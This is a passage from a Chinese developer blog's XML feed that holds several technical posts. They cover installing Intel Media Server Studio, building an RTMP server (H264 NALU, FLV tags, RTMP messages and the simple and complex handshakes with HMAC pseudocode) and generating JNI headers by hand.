for i in ../intel-kernel-patches/*.patch; do patch -p1 &lt; $i; done


编译打过补丁的内核,并安装，这里你可以喝杯茶休息一会儿！


echo "build patched 4.4 kernel"
make olddefconfig
make -j 8
make modules_install
make install
  若遇到如下错误：

    
        
    
 
  安装openssl相关依赖
apt install libssl-dev
apt install openssl


重启就OK。






如果遇到无法进入图形界面



进入命令模式，把 /usr/lib64   /usr/local/lib   /opt/intel/mediasdk/lib64/ 添加到LD_LIBRARY_PATH 或者把上述目录添加到系统库搜索路径中去。（ld.so.config）


更改grub的默认启动内核或者手动选择启动的内核版本，必须选择刚才安装的4.4.0


删除用户目录下的.Xauthority文件






测试安装成功



解压MediaSamples_Linux_2017R3_b698.tar.gz，并进入MediaSamples_Linux_2017R3_b698/samples/_bin/x64/
目录，


检查驱动是否加载成功


vainfo | grep -v 'unknown'

    
        
    
 


测试例子


./sample_multi_transcode -i::h264 ../content/test_stream.264 -o::h264 test_out.h264 -hw –la

    
        
    
 


如果结果和上述图中类似，即可代表sdk安装成功。






后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>硬编解码</tag>
        <tag>Intel Media Server Studio(ubuntu)</tag>
      </tags>
  </entry>
  <entry>
    <title>一个简单的RTMP服务器实现 --- RTMP与FLV</title>
    <url>/2019/01/07/blog_idx_076/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

  参考前置文章：《一个简单的RTMP服务器实现 — H264编码》https://blog.csdn.net/u011728480/article/details/85770696




前置知识
  《一个简单的RTMP服务器实现 — H264编码》：https://blog.csdn.net/u011728480/article/details/85770696




FLV 简介

  Adobe 公司推出一种格式（Flash Video），由于其文件后缀为.flv。
  本文为何要介绍这种视频格式呢？因为在RTMP传输音视频过程中，有人发现：发送的音视频包结构和flv的文件格式部分内容非常相似。现在的网络上，有许多介绍FLV文件结构的文章，因此我不重复制造轮子。我这里只介绍RTMP中需要的FLV知识，其他内容不做说明。
  如果我们想要通过RTMP发送音视频，必须了解部分flv的封装格式。




RTMP 中我用过的FLV相关知识



FLV 文件结构简述
  FLV 文件 = FLVFileHeader + FLVFileBody
(说明：FLV文件由文件头和文件体构成)
  FLVFileBody =  $$ PreviousTAGSize_0  +  \sum_{k=1}^n{((TAG )_k + (PreviousTAGSize)_k)}$$
（说明：文件体由N个TAG和N+1个TAGsize构成，其中previousTagsize0值固定为零。其中previoustagsize代表前面一个tag的大小。）
  一句话来说，一个FLV文件：FLV文件头 + PreviousTagSize0 + TAG1 + PreviousTagSize1 +  … … … … + TAGn + PreviousTagSizen


FLV Tag说明
  在RTMP中，所需要通过RTMP协议传输的音视频数据结构就是FLV中音视频的TAG结构。
  这里，只着重介绍Flv中VideoTag结构，并稍微介绍一下ScriptTag。至于AudioTag结构，我的服务器中没有实现，我也没有使用。同时，你只要会了RTMP推送VideoTag结构，那么你类比一下，就会用RTMP推送AudioTag结构。


FLV Video Tag
  VideoTag = VideoTagHeader+ VideoData
  其中VideoTagHeader结构如下图：


在RTMP中，我们常见的Header第一byte为0x17 和 0x27.分别代表关键帧（key帧或者AVC sequence header）和其他帧。


在Header的第一字节中，假如CodecID == 7，那么Header会多出4个字节。他们分别是AVCPacketType（1byte）和CompositionTime(3bytes)。



    
        
    
  


对于AVCPacketType（一字节）,有如下定义：


The following values are defined:
0 &#x3D; AVC sequence header（AVC sequence header及其重要，代表后面的数据是AVCDecoderConfigurationRecord）
1 &#x3D; AVC NALU （具体的视频数据，关于NALU，可参考前置文章）
2 &#x3D; AVC end of sequence (lower level NALU sequence ender is
not required or supported)


当AVCPacketType == 1的时候，后面跟随的数据即为h264的nalu（非pps和sps）




AVCDecoderConfigurationRecord
  AVCDecoderConfigurationRecord （AVC sequence header）是一个重要的结构，为啥这样说，因为这种类型的VideoTag数据头后，存放的数据包含sps和pps。其结构如下图所示：

    
        
    
  
  这里简单说明一下：结构图中所示的numOfSequenceParameterSets后，有两个字节的是sequenceParameterSetLength。之后存储的是h264中sps的NALU。pps 同理。
  前文我说了，RTMP传输的是VideoTag，但是如果你传输第一个VideoTag不是AVCDecoderConfigurationRecord 的话，那么你的视频是不能够被相关RTMP播放器解码的，因为sps和pps是 初始化h264解码器的重要参数。
注意咯：rtmp传输的第一个videotag一定要传输AVC sequence header这种类型的包。同时再提示一波，传输音频的时候也是如此。


FLV Script Tag（onMetaData）
  ScriptTag是用来发送一些控制属性的。
  其中onMetaData这种tag包含了一些视频的属性，在RTMP中，需要在传输音频和视频之前发送这个onMetaData包。

    
        
    
  




后记

总结：


发送音视频之前需要发送音视频配置tag，比如AVC sequence header


在发送音视频tag之前，必须发送onMetaData tag


参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>视频处理及流媒体</category>
      </categories>
      <tags>
        <tag>RTMP与FLV</tag>
      </tags>
  </entry>
  <entry>
    <title>一个简单的RTMP服务器实现 --- RTMP实现要点</title>
    <url>/2019/01/08/blog_idx_077/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

  参考前置文章：《一个简单的RTMP服务器实现 — RTMP与H264》https://blog.csdn.net/u011728480/article/details/85770696
前置知识

  《一个简单的RTMP服务器实现 — RTMP与H264》：https://blog.csdn.net/u011728480/article/details/85770696
  《一个简单的RTMP服务器实现 — RTMP与FLV》：https://blog.csdn.net/u011728480/article/details/85780974




RTMP简介

  RTMP是Real Time Messaging Protocol的简写。RTMP是应用层协议，其是基于TCP实现的。
  网上有许多介绍RTMP基础知识的地方，本文不重复介绍。但是如果有人对以下概念不熟悉的，建议去随意找一篇翻译《rtmp_specification_1.0.pdf》的文章即可。
  阅读本文需要找一篇RTMP的详细知识总结，一起配合阅读。




RTMP基本知识要点



Chunk 、ChunkStream和ChunkStreamID
  Chunk是RTMP的一种应用层分包结构。
  ChunkStream是一种逻辑通道，代表的是RTMP Message分包为Chunk之后的传输的一种数据流。可从服务器到客户端，反之亦然。
  ChunkStreamID是描述ChunkStream的一个ID，消息拆包为Chunk后，可根据此ID的标识来组合Message。其取值范围为3~65599（2^16 -1 + 2 ^6 -1）。0代表2byte形式ChunkbasicHeader，1代表3byte形式ChunkbasicHeader。2代表是控制消息和命令的流。
  下图为chunkbasicheader格式图：

    
        
    
  
  下图为chunk格式图：

    
        
    
  


Message、MessageStream和MessageStreamID
  Message是RTMP协议的基本数据结构。绝大部分RTMP协议的数据发送都必须按照此结构来封装。
  MessageStream也是一种逻辑通道，它描述的是一种消息流。根据抓包结果显示，基本的消息通信为一种消息流，音视频消息通信为另外一种流。这种逻辑流在RTMP播放过程中一定要注意。
  MessageStreamID是一种表示MessageStream的ID。
  Message有多种结构，由chunkbasicheader中fmt字段决定，有如下四种格式：
  type0

    
        
    
  
&emsp;&emsp;type1

    
        
    
  
&emsp;&emsp;type2

    
        
    
  
&emsp;&emsp;type3, 没有头结构。


Message   ~   Control Message
  控制消息是一些设置属性的消息。他们的MessageTypeId是1-7.


MessageTypeId==1，设置Chunk分包大小，默认为128bytes



    
        
    
  


MessageTypeId==2，终止消息，如果一个消息正在被等待接收完毕（Chunk分包没有接收完毕），那么本消息用于放弃这个消息的等待。



    
        
    
  


MessageTypeId==3，确认消息。本消息用于发送本客户端接收到了多少数据。



    
        
    
  


MessageTypeId==4，用户控制报文信息。具体用户控制报文看后文



    
        
    
  
  用户控制报文协议中Stream Begin是实现RTMP的播放的重要的一个报文。详情参考RTMP官方文档，及其他参考资料。


MessageTypeId==5，发送窗口确认大小信息。用于设置窗口大小，达到这个值后，回复确认信息。



    
        
    
  


MessageTypeId==6，设置对端带宽信息。如果，携带的确认窗口信息大小和之前不一致，要回应一个确认窗口信息大小。反之，不回应。



    
        
    
  


MessageTypeId==7 ，保留。




Message ~ Command Message
MessageTypeId==17或者20. 17对应的格式是AMF3,20对应的格式是AMF0.
connect, createStream, publish, play, pause等命令是非常重要的。特别注意其中的事物ID，这个ID是关键。


Message ~ Data message
MessageTypeId==18或者15. 18对应的格式是AMF0。15对应的格式是AMF3.
Metadata的发送，就要靠此类型的消息。


Message ~ Shared object message
MessageTypeId==19或者16，19对应格式是AMF0,16对应的格式是AMF3.


Message ~ Audio message
MessageTypeId==8 音频数据


Message ~ Video message
MessageTypeId==9 视频数据


Message ~ Aggregate message
MessageTypeId==22 聚集消息数据


NetConnection相关命令
  NetConnection相关的命令是用于处理RTMP连接方面的问题，当使用命令createstream后，就会创建成功一个流了，就会切换到NetStream相关命令下工作。
  本文的服务器用了的命令为connect、createstream等等。
  具体用法可看下文抓包分析，特别是这些命令的的回应，是本文的重点。


NetStream相关命令
  本文的服务器用了命令为play、pause等等。
  具体用法可看下文抓包分析，特别是这些命令的的回应，是本文的重点。


AMF0和AMF3格式
  这种格式是用来序列化相关数据的。具体参考其他文章。




RTMP 通信流程分析（理论和抓包结合）



RTMP 简单握手(此种握手为造成一个坑爹的问题，具体看文末注意事项。)
  c0和s0结构：

    
        
    
    
  c0和s0实际抓包：

    
        
    
    
  C1和S1结构：

    
        
    
  
  zero字段必须为0.
  random区域长度为1528bytes的随机数。
  C1和S1实际抓包：

    
        
    
  
  从图中可以看出，我服务器回应的随机字节基本都是0。
  C2和S2实际抓包：

    
        
    
  
  图中可以看出，S2C1。同理C2S1。
  简单握手时序图：

    
        
    
  
  实际过程中，C0和C1一起发送，服务器一起回应S0,S1,S2。当握手完毕后，就会进入下一阶段。


RTMP 连接及响应
  首先给出连接及响应时序图：

    
        
    
   
  Command Message 之 connect

    
        
    
   
  从这里可以看到，connect命令携带了rtmp流地址的属性以及相关的版本。关于这个命令的重点其实是其事物ID的值是1。
  作为connect的回应，这里一般来说有如下几个基本消息需要发送：


确认窗口大小信息


设置带宽信息


设置Chunk分包大小



    
        
    
   
  最终，我们需要对connect命令进行回应，如果不回应或者回应错误，将不会走到下一步。
  _result命令：
  这里的一个重点是事物ID必须为1，表示对connect的回应。
  其次，携带的object必须包含connect的状态回应属性，如：NetConnection.Connect.Success和Connection succeeded.等等

    
        
    
   
  当客户端收到connect 的回应后，客户端发送createstream命令，服务端收到createstream命令后，发送createstream响应命令。

    
        
    
   
  注意画框部分的事物ID，同时也注意回应命令中，数字为1的流ID，这个值代表的是对于本次连接，MessageStreamID必须为此值。对于本连接来说，后续所有需要发送MessageStreamID的地方必须填写此值，才能够完成相关通信。


RTMP 播放及响应命令
  播放时序图：

    
        
    
   
  当创建流成功后，客户端会发送一个play命令：

    
        
    
  
  这里需要注意的是事物ID为0，且包含要播放那个视频流的属性。这里的test就是这个地址里面的rtmp://xxx.xxx.xxx.xxx/live/test
  这个时候服务器会设置相应的属性：如设置chunk大小等等。同时服务器会回应用户控制消息streambegin。
  最后服务器会回应play命令：

    
        
    
  
  这个时候，其实就是可以发送媒体数据了，但是根据抓包结果显示，还需要这个数据：

    
        
    
  


RTMP传输音视频
  在传输音视频之前，必须先传输onMetaData（参考flv一文）数据。

    
        
    
  
  然后可以传输音视频数据了，
  但是传输普通的音视频数据之前，必须传输相关的配置数据。对于h264视频来说，就是flv一文中的AVCDecoderConfigurationRecord 的videotag数据。然年即可传输普通的音视频数据。

    
        
    
  
  注意：在创建成功一个流之后，发送的媒体数据中的MessageStreamID必须为上文createstream 返回的值。
 注意：如果严格按照上文实现，就可以用vlc或者plotplayer等等播放对应的RTMP流。但是，Flash网页播放器一定不能够播放（具体表现为所有都工作正常，只是页面没有画面，像没有接收到数据一样）。原因是简单握手导致的。




后记

  总结：


根据官方文档实现相关功能后，如果没有达到预期效果，别急慢慢排查。至少我是这样的，别把思路搞混了就行了。


还有一个教训就是：相信自己，要敢于怀疑别人的资料是错的。


参考文献


rtmp_specification_1.0.pdf







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>视频处理及流媒体</category>
      </categories>
      <tags>
        <tag>RTMP服务器实现要点</tag>
      </tags>
  </entry>
  <entry>
    <title>一个简单的RTMP服务器实现 --- RTMP与H264</title>
    <url>/2019/01/04/blog_idx_075/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

  由于公司需要把相关视觉算法结果以流媒体的方式可视化出来，这样可以有利于推广、演示和其他等等。
  一般来说：视觉算法一般都是通过某种方式（USB接口、RTSP等等方式）采集摄像头的图像数据，然后送入视觉算法，取出视觉算法的结果，然后根据算法结果在原图上画出相关的检测结果，这样即可把算法结果可视化，而且也是比较实际的一种可视化方式。
  现在要做的是把这些可视化结果做成一个可以播放的视频。根据这样一个需求，初步确定就是视频编码然后通过相应的流媒体协议发送出去，然后就可以用相应的播放器播放了。由于考虑到后期可能会涉及到移动端播放视频以及以及减轻前端的开发难度（前端可直接用H5播放），选择了H264+RTMP这样一种方式。
  市面上成熟的RTMP服务器很多，开源的也有（SRS，CRTMPSERVER等等），商业的也有（万恶之源ADOBE FLASH SERVER），它们的一般流程都是：一个程序推流，一个RTMP服务器接收推送的流。但是考虑到我们的嵌入式设备，要尽可能的减少资源占用，精简项目架构，准备把推流和RTMP服务器结合起来开发。
  于是，需要在设备上采集相机数据（解码），送给视觉算法检测，然后把检测结果画出来，然后通过H264编码，然后其他人可以通过打开一个网页看到我们的RTMP服务器推送是视频。




H264编码

  本系列的重点本来是根据RTMP协议实现一个RTMP服务器，至少我没有做这件事情之前是这样认为的。但是做完这件事情后，我发现还是先从一些和RTMP相关的H264的要点说起来。
  H264的基本知识网上有许多资料，我这里不会完整的翻译这些文章，我只会提出部分内容，这些内容是和RTMP推流息息相关的。（PS:说一句，我在整个过程中用了许多H264相关的知识，但是我依然是一个H264的小白，我只需要会用就行了，至于怎么压缩怎么编码的，我根本不知道！！！！！！）
  阅读本文前：建议先找一篇网上的有H264详细内容的看一看，了解个大概。


NALU
  H264 的功能结构分为视频编码层(VCL)和网络提取层(NAL).VCL层输出的是编码器输出原始图像经过编码后的数据流，NAL层输出的是可以存储和传输的数据结构。
NAL &#x3D; NALHeader + RBSP（Raw Byte Sequence Payload）

NALHeader有如下我们熟悉的内容：
0x65   ----    I帧NALHeader
0x67   ----    sps帧NALHeader，这里面包含了分辨率及其他解码器需要的信息。
0x68   ----    pps帧NALHeader，这里包含了解码器需要的信息。
... ...

RBSP就是实际携带视频数据的字段。
  注意：这里的一个NALU可能一帧数据（一张图片）也可能不是。


Annex B ----  Byte stream format
  在h264的文档中，附录B有一个字节流格式，这个是官方推荐和国际标准的。所以，现在大多数编码器输出的数据的结构变为了这种结构。结构如下：
STARTCODE + NALU &#x3D; STARTCODE + NALHeader + RBSP

STARTCODE 就是 0x000001 或者 0x00000001
  这种结构如官方文档下图所示：

    
        
    
    




后记

  以上两类知识在RTMP是非常重要。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>视频处理及流媒体</category>
      </categories>
      <tags>
        <tag>RTMP与H264</tag>
      </tags>
  </entry>
  <entry>
    <title>java 手动生成jni头文件(JNI静态注册)</title>
    <url>/2019/02/14/blog_idx_079/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
原因



我之前写过一篇jni的文章，在那篇文中，我要为java jni静态注册补充一下，生成jni头文件相关的知识。


在我们使用as开发带jni的app的时候，我们自己写的java native 方法，可以通过一定方式方便的生成jni的头文件，但是我们没有关注他是怎么生成的？


在实际使用过程中，特别是测试过程中，或者为一个第三方c和c++库写jni接口时，手动生成jni头文件也是必须要掌握的。






方法



首先在java层写你的native方法，注意包名等等。我这里的例子如下：


package com;


public class shmem&#123;
	
	static &#123;
		
		System.loadLibrary("libandroid-shmem.so");
	&#125;
	
	public native int CreateSHMEM(int size);
	
	public native int AttachSHMEM();
	
	public native int SetDataToSHMEM(byte[] data_buf);
	
	public native int GetDataFromSHMEM(byte[] data_buf, int size);
	
	public native int DetachSHMEM();
	
	public native int MarkDeleteSHMEM();
	
&#125;;


使用java sdk带的javac命令编译这个java文件。（注意这里的包名为com。那么记得把shmem.java放到一个名为com的文件夹下面去。）


javac shmem.java

    
        
    
    


通过javah命令生成jni头文件。（注意这里是完整的类名,shmem.class 必须在com文件夹下面）


javah -jni com.shmem

    
        
    
    


生成的jni头文件实例


/* DO NOT EDIT THIS FILE - it is machine generated */
#include &lt;jni.h>
/* Header for class com_shmem */

#ifndef _Included_com_shmem
#define _Included_com_shmem
#ifdef __cplusplus
extern "C" &#123;
#endif
/*
 * Class:     com_shmem
 * Method:    CreateSHMEM
 * Signature: (I)I
 */
JNIEXPORT jint JNICALL Java_com_shmem_CreateSHMEM
  (JNIEnv *, jobject, jint);

/*
 * Class:     com_shmem
 * Method:    AttachSHMEM
 * Signature: ()I
 */
JNIEXPORT jint JNICALL Java_com_shmem_AttachSHMEM
  (JNIEnv *, jobject);

/*
 * Class:     com_shmem
 * Method:    SetDataToSHMEM
 * Signature: ([B)I
 */
JNIEXPORT jint JNICALL Java_com_shmem_SetDataToSHMEM
  (JNIEnv *, jobject, jbyteArray);

/*
 * Class:     com_shmem
 * Method:    GetDataFromSHMEM
 * Signature: ([BI)I
 */
JNIEXPORT jint JNICALL Java_com_shmem_GetDataFromSHMEM
  (JNIEnv *, jobject, jbyteArray, jint);

/*
 * Class:     com_shmem
 * Method:    DetachSHMEM
 * Signature: ()I
 */
JNIEXPORT jint JNICALL Java_com_shmem_DetachSHMEM
  (JNIEnv *, jobject);

/*
 * Class:     com_shmem
 * Method:    MarkDeleteSHMEM
 * Signature: ()I
 */
JNIEXPORT jint JNICALL Java_com_shmem_MarkDeleteSHMEM
  (JNIEnv *, jobject);

#ifdef __cplusplus
&#125;
#endif
#endif


  这样我们就可以在生成的内容上修改修改就可以实际使用了。


题外话：其实我们使用as等ide自动生成jni头文件，其底层的原理就是这几句简单的shell命令。






后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>jni</tag>
      </tags>
  </entry>
  <entry>
    <title>一个简单的RTMP服务器实现 --- RTMP复杂握手（Complex Handshake）</title>
    <url>/2019/01/09/blog_idx_078/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

  参考前置文章：《一个简单的RTMP服务器实现 — RTMP与H264》https://blog.csdn.net/u011728480/article/details/85770696




前置知识

  《一个简单的RTMP服务器实现 — RTMP与H264》：https://blog.csdn.net/u011728480/article/details/85770696
  《一个简单的RTMP服务器实现 — RTMP与FLV》：https://blog.csdn.net/u011728480/article/details/85780974
  《一个简单的RTMP服务器实现 — RTMP实现要点》：https://blog.csdn.net/u011728480/article/details/86010851




为啥需要RTMP复杂握手

  曾经的我，那么的天真，我按照官方文档以及官方文档的相关资料进行了RTMP的服务器的实现。奈何，前端使用的是Video.js，需要调用flash进行rtmp流播放，但是就是播放不起来。
  在许多次尝试后，flash还是不能够播放我传输的rtmp流。我就开始了怀疑人生了。因为vlc和plotplayer都是能播放的，但是flash不能够播放。于是乎，我就猜想是flash播放器有什么特殊的毛病，需要我去治一治。
  又过了许久，我搜遍了网络，我第一次看见这个问题的可能答案是在某论坛的一篇过期的帖子里面。
  原因是flash播放器需要特殊的握手方式才能够播放h264+aac的rtmp流（具体表现为：播放器连接上了rtmp服务器，但是没有任何图像和声音）。于是我知道了，我需要改变自己的服务器的握手流程。
  经过前期在RTMP中的折腾，我知道我要找的东西是RTMP复杂握手流程。于是就去网上找了找。经过查找，发现了一篇不错的文章：https://blog.csdn.net/win_lin/article/details/13006803 (这篇文章貌似是srs的作者写的，里面就有我现在这个问题的答案，这里及其感谢大佬的文章。)
  本文内容是上文提到的大佬的文章的一个补充，希望大家结合着一起看，实现自己的RTMP服务器。




RTMP复杂握手

  下图为S1,C1。S2,C2的结构图

    
        
    
    
  上图中一眼就可以看懂相关包的结构。其中需要注意的是一个c1_s1-joined的结构。他是把s1,c1中的digest的32bytes去除后，然后把剩下的内容拼接在一起形成的一个数组。
  下面这两个数组是一个常量，在后面的计算会用到。
private static final byte[] FP_KEY = &#123;
    (byte) 0x47, (byte) 0x65, (byte) 0x6E, (byte) 0x75, (byte) 0x69, (byte) 0x6E, (byte) 0x65, (byte) 0x20,
    (byte) 0x41, (byte) 0x64, (byte) 0x6F, (byte) 0x62, (byte) 0x65, (byte) 0x20, (byte) 0x46, (byte) 0x6C,
    (byte) 0x61, (byte) 0x73, (byte) 0x68, (byte) 0x20, (byte) 0x50, (byte) 0x6C, (byte) 0x61, (byte) 0x79,
    (byte) 0x65, (byte) 0x72, (byte) 0x20, (byte) 0x30, (byte) 0x30, (byte) 0x31, // Genuine Adobe Flash Player 001
    (byte) 0xF0, (byte) 0xEE, (byte) 0xC2, (byte) 0x4A, (byte) 0x80, (byte) 0x68, (byte) 0xBE, (byte) 0xE8,
    (byte) 0x2E, (byte) 0x00, (byte) 0xD0, (byte) 0xD1, (byte) 0x02, (byte) 0x9E, (byte) 0x7E, (byte) 0x57,
    (byte) 0x6E, (byte) 0xEC, (byte) 0x5D, (byte) 0x2D, (byte) 0x29, (byte) 0x80, (byte) 0x6F, (byte) 0xAB,
    (byte) 0x93, (byte) 0xB8, (byte) 0xE6, (byte) 0x36, (byte) 0xCF, (byte) 0xEB, (byte) 0x31, (byte) 0xAE&#125;;


private static final byte FMSKey[] = &#123;
        (byte)0x47, (byte)0x65, (byte)0x6e, (byte)0x75, (byte)0x69, (byte)0x6e, (byte)0x65, (byte)0x20,
        (byte)0x41, (byte)0x64, (byte)0x6f, (byte)0x62, (byte)0x65, (byte)0x20, (byte)0x46, (byte)0x6c,
        (byte)0x61, (byte)0x73, (byte)0x68, (byte)0x20, (byte)0x4d, (byte)0x65, (byte)0x64, (byte)0x69,
        (byte)0x61, (byte)0x20, (byte)0x53, (byte)0x65, (byte)0x72, (byte)0x76, (byte)0x65, (byte)0x72,
        (byte)0x20, (byte)0x30, (byte)0x30, (byte)0x31, // Genuine Adobe Flash Media Server 001
        (byte)0xf0, (byte)0xee, (byte)0xc2, (byte)0x4a, (byte)0x80, (byte)0x68, (byte)0xbe, (byte)0xe8,
        (byte)0x2e, (byte)0x00, (byte)0xd0, (byte)0xd1, (byte)0x02, (byte)0x9e, (byte)0x7e, (byte)0x57,
        (byte)0x6e, (byte)0xec, (byte)0x5d, (byte)0x2d, (byte)0x29, (byte)0x80, (byte)0x6f, (byte)0xab,
        (byte)0x93, (byte)0xb8, (byte)0xe6, (byte)0x36, (byte)0xcf, (byte)0xeb, (byte)0x31, (byte)0xae
&#125;; 




C1，S1 伪代码实现

  下面会列出c1的伪代码实现
unsigned char * const C1 = new unsigned char[1536];//s1,c1,s2,c2大小都是1536字节

Random(C1);//把C1每个字节随机化

C1[0-3] = current_time();

C1[4-7] = &#123;0x80, 0x00, 0x07, 0x02&#125;;//这个是定值

//自行决定使用哪种schema结构,定义c1_schema_type


int key_offset = Random(0-632);//在取值范围[0-632) (764-4-128，观察key结构可知)中随机一个值赋值给key_offset(key-data的相对位置).

int digest_offset = Random(0-728);//在取值范围[0-728)(764-32-4，观察digest结构可知)中随机一个值赋值给digest_offset(digest-data的相对位置).

int absolute_key_offset = CalAbsoluteKeyOffset(key_offset, c1_schema_type );//根据c1_schema_type，按照相同类型获取key结构中，key-data在数组中的绝对位置

int absolute_digest_offset = CalAbsoluteDigestOffset(digest_offset , c1_schema_type );//根据c1_schema_type，按照相同类型获取digest结构中，digest-data在数组中的绝对位置

SetC1KeyOffset(key_offset, c1_schema_type);//把keyoffset设置到C1中，注意，key结构中这里的offset 的4个字节的值必须加起来等于key_offset的值。

SetC1DigestOffset(digest_offset , c1_schema_type);//把digest_offset 设置到C1中，注意，digest结构中这里的offset 的4个字节的值必须加起来等于digest_offset 的值。

c1_s1_joined_array = GetC1JoinedArray(absolute_digest_offset);//这里是根据绝对digest偏移，然后去掉digest32个字节，然后返回digest的前后组合得到的数组结果（1536-32）

c1_digest = HMACsha256(c1_s1_joined_array , FP_KEY, 30);//调用openssl中的Hmacsha256算法计算秘钥
SetC1Digest(c1_digest , c1_schema_type);//把计算出来的digest设置到c1中去。然后c1构造完成，即可发送给服务器
  注意：C1中的key值就是我们的随机值即可。严格按照顺序计算，设置时间，版本，key_offset,digest_offset，然后才能够计算c1_s1_joined_array，最后得到c1_digest。
  下面会列出s1的伪代码实现
unsigned char * const S1 = new unsigned char[1536];//s1,c1,s2,c2大小都是1536字节

Random(S1);//把S1每个字节随机化

S1[0-3] = current_time();

S1[4-7] = &#123;0x04, 0x05, 0x00, 0x01&#125;;//这个是定值版本。

c1_schema_type = GetC1SchemaType();//获取C1的schema type。得出是key-digest structure 还是 digest-key structure

int key_offset = Random(0-632);//在取值范围[0-632) (764-4-128，观察key结构可知)中随机一个值赋值给key_offset(key-data的相对位置).

int digest_offset = Random(0-728);//在取值范围[0-728)(764-32-4，观察digest结构可知)中随机一个值赋值给digest_offset(digest-data的相对位置).

int absolute_key_offset = CalAbsoluteKeyOffset(key_offset, c1_schema_type );//根据c1_schema_type，按照相同类型获取key结构中，key-data在数组中的绝对位置

int absolute_digest_offset = CalAbsoluteDigestOffset(digest_offset , c1_schema_type );//根据c1_schema_type，按照相同类型获取digest结构中，digest-data在数组中的绝对位置

SetS1KeyOffset(key_offset, c1_schema_type);//把keyoffset设置到S1中，注意，key结构中这里的offset 的4个字节的值必须加起来等于key_offset的值。

SetS1DigestOffset(digest_offset , c1_schema_type);//把digest_offset 设置到S1中，注意，digest结构中这里的offset 的4个字节的值必须加起来等于digest_offset 的值。

unsigned char * const c1_key = GetC1Key();//获取C1的key

//这里参考srs开源框架的实现，调用openssl的DH算法中相关内容。
//根据上文那篇srs作者的文章的评论部分内容，这里相当于是要算出一个128公钥作为s1的key就可以了。不需要得到共享秘钥。
unsigned char * const s1_key = GetDHPublicKey();

SetS1Key(s1_key , c1_schema_type);//设置s1 key 到s1数组中，方便计算c1_s1-joined结构。
c1_s1_joined_array = GetS1JoinedArray(absolute_digest_offset);//这里是根据绝对digest偏移，然后去掉digest32个字节，然后返回digest的前后组合得到的数组结果（1536-32）

s1_digest = HMACsha256(c1_s1_joined_array , FMSKey, 36);//调用openssl中的Hmacsha256算法计算秘钥

SetS1Digest(s1_digest , c1_schema_type);//把计算出来的digest设置到s1中去。然后s1构造完成，即可发送给客户端
  这里必须严格按照流程走：
  把1536字节buffer随机化，设置时间，版本信息。设置s1_key，s1_key_offset信息，然后设置s1_digest_offset信息。以上都做完以后，计算出c1_s1_joined_array 。根据c1_s1_joined_array ，FMSKey计算出s1_digest，把s1_digest设置到s1buffer中。到了这一步，即可把s1发送出去了。




C2 S2的伪代码实现

  C2伪代码实现
unsigned char * const C2 = new unsigned char[1536];//s1,c1,s2,c2大小都是1536字节

Random(C2);//把C2每个字节随机化

s1_digest = GetS1Digest();//得到s1的digest

tmp_key = HMACsha256(s1_digest, FPKey, 62);

c2_random_data = GetC2RandomData();//得到c2[0~1503]

c2_digest = HMACsha256(c2_random_data, tmp_key, 32);

SetC2Digest(c2_digest);

  就是连续计算秘钥得到C2 key即可
  S2伪代码实现
unsigned char * const S2 = new unsigned char[1536];//s1,c1,s2,c2大小都是1536字节

Random(S2);//把S2每个字节随机化

c1_digest = GetC1Digest();//得到c1的digest

tmp_key = HMACsha256(c1_digest, FMSKey, 68);

s2_random_data = GetS2RandomData();//得到s2[0~1503]

s2_digest = HMACsha256(s2_random_data, tmp_key, 32);

SetS2Digest(s2_digest);




后记

  总结：


就是按照别人推断出来的东西进行代码实现，同时明确一下一些字段定义。


按照大佬文中评论，验证了一下，public_key和share_key对RTMP没有影响。


本系列文末总结


按照一个文档，实现了相关功能是一件有成就感的事情。


现在已经是2019年了，你要相信，你要做的事情，极有可能是别人做过的，可以去多查查资料以备参考。


静下心来做事，我发现有些时候我很浮躁。同时敢怀疑别人，并且思索怀疑的理由。


参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>视频处理及流媒体</category>
      </categories>
      <tags>
        <tag>RTMP Complex Handshake</tag>
      </tags>
  </entry>
  <entry>
